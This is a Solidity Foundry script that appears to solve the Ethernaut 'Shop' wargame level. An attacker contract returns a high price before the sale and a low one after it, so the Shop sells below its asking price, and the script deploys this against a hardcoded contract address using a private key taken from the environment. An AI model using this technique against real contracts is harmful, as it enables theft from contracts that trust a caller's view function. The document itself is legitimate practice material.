// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/21-Shop.sol"; 

contract Exploit is Buyer {
    Shop public shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view override returns (uint256) {
        return shop.isSold() ? 1 : 100;  //利用点！
    }

    function attack() public {
        shop.buy();
    }
}
contract Exp is Script {

    Shop public ShopInstance = Shop(payable(0xA030423bd58384B4D0D64Acc593D87A897EfA2B9));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 
    Exploit public attackContract;

    function attack() public {
        attackContract = new Exploit(address(ShopInstance));
        attackContract.attack();       
    }
    function run() external {
        vm.startBroadcast(hacker);
        attack();
        vm.stopBroadcast();
        }
}